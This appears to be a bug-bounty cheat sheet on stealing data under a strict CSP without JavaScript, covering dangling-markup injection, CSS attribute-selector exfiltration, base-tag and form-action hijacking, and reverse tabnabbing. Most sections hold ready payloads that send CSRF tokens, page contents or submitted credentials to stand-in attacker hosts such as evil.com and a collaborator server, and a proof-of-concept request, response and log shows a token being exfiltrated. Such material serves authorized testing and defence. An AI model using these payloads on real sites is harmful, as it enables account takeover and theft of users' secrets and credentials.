# Dangling Markup, CSS Injection & Text-Only Injection

**What it is:** Data exfiltration and takeover when you can inject HTML/CSS but full `<script>` is blocked (strong CSP or sanitizer strips JS). No JS needed.

## Dangling markup injection
Inject an unterminated tag; the browser swallows following page markup (including CSRF tokens/secrets) into a URL sent to you.
```html
<img src='https://evil.com/log?html=
```
Everything up to the next `'` gets appended and leaked when the image "loads". Works to steal:
- CSRF tokens rendered later in the page.
- Auth tokens, email, PII in the DOM.

Base tag variant (hijack relative URLs / form action):
```html
<base href='https://evil.com/'>
<form> ... (existing form now posts to evil)
```

## CSS injection (exfil without JS)
When you control a `<style>` or style attribute (CSP allows inline style, blocks script):
- Attribute-value exfil via attribute selectors + `background:url()`:
```css
input[name=csrf][value^="a"]{background:url(https://evil.com/leak?c=a)}
input[name=csrf][value^="b"]{background:url(https://evil.com/leak?c=b)}
```
Char-by-char leak of a hidden token. Automate with a generated stylesheet + `@import` chaining.
- `@font-face` + `unicode-range` and ligature tricks to read text.
- Keylogging-ish via `:focus`/`:valid` selectors + background requests.

## Reverse tabnabbing
`target=_blank` without `rel=noopener` → the opened attacker page rewrites `window.opener.location` to a phishing clone.

## Where to inject
Comment/review bodies, markdown renderers with a sanitizer, email HTML, PDF/HTML export, name fields shown on a token page.

## Impact
CSRF-token theft → CSRF chain → ATO, secret/PII exfil, credential phishing — all under a strict CSP that blocks classic XSS.

## 🎯 PoC — Request → Response (dangling markup leaks CSRF token)

Inject an unterminated attribute into a reflected field; the browser slurps following markup into the image URL:
```http
GET /search?q=%3Cimg%20src%3D%27https://COLLAB/leak%3F HTTP/2
Host: target.com
Cookie: session=<victim>
```
```http
HTTP/2 200 OK
Content-Type: text/html

...<div>Results for '<img src='https://COLLAB/leak?
</div>
<form action="/account/email">
  <input type="hidden" name="csrf" value="a9f3c1d0e...">      ← swept into the image URL
```
Browser requests `https://COLLAB/leak?...csrf...value="a9f3c1d0e"...`. Collaborator log:
```
GET /leak?...name="csrf"%20value="a9f3c1d0e..."  from victim IP   ← token exfiltrated, no JS needed
```
Works under a strict CSP that blocks `<script>` but allows `<img>`.

## Deep cuts — CSS-only exfil & no-`<img>` dangling
- [ ] **Sequential CSS exfil (`@import` chaining):** when you can only inject one stylesheet at a time, leak char-N, then `@import` the next attacker stylesheet that knows N and probes N+1 — recovers a full token with recursive imports (blind, no JS).
- [ ] **`:has()` / attribute selectors for arbitrary text:** modern `:has()` lets you condition on sibling/child content; combine with `background:url()` to leak text nodes, not just input values.
- [ ] **Font-based exfil:** `@font-face` + `unicode-range` + ligatures + `size-adjust`/scrollbar width oracle to read rendered text character presence.
- [ ] **No-`<img>` dangling vectors:** `<link rel=prefetch/preload/dns-prefetch href='https://collab?`, `<meta http-equiv=refresh content='0;url=https://collab?`, `<object data=`, `<video><source src=`, `<iframe src=`, unclosed `<textarea>`/`<title>`/`<style>`/`<noscript>` to swallow following markup.
- [ ] **Form-action / `<base>` hijack for credential capture:** `<base href=//evil>` or an injected `<form action=//evil>` re-points the real login/reset form → submitted creds go to you (great under CSP that blocks script).
- [ ] **CSP-allowed exfil sinks:** if `img-src`/`style-src`/`font-src`/`connect-src` allows a broad host or `data:`, route the leak there; `report-uri`/`report-to` can also carry data in the violated-URL path.
- [ ] **Markdown/rich-text dangling:** `![](https://collab?` image syntax, reference-style links, and HTML-in-markdown that the sanitizer leaves half-open.
- [ ] **Scroll-to-text / `:target` oracles:** URL-fragment-driven styling can reveal whether specific text exists on a victim's authed page (XS-Leak-adjacent, see the XS-Leaks file).

## Report notes
Show the leaked secret arriving at your server (Collaborator). State the CSP that blocks script but allows your vector, and name the technique (dangling / `@import` CSS / font / form-hijack).
